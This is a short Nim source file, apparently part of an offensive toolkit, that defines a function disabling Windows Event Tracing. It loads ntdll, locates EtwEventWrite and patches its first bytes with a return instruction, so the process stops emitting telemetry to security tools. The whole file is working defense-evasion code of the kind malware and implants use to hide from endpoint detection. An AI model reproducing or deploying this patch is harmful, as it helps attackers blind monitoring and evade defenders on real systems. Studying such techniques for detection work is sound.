import dynlib
import ../utils/utils
import ../utils/mem_helper

when defined amd64:
  const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
  const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

proc bypassEtw*(): bool =
  var
    ntdll: LibHandle
    cs: pointer
    disabled: bool = false

  # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
  # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
  ntdll = loadLib("ntdll")
  if isNil(ntdll):
    DBG("[X] Failed to load ntdll.dll")
    return disabled

  cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()


  if isNil(cs):
    DBG("[X] Failed to get the address of 'EtwEventWrite'")
    return disabled

  # Does the patching writing to
  # memory for us
  return protectAndWrite(unsafeAddr patch, patch.len, cs)
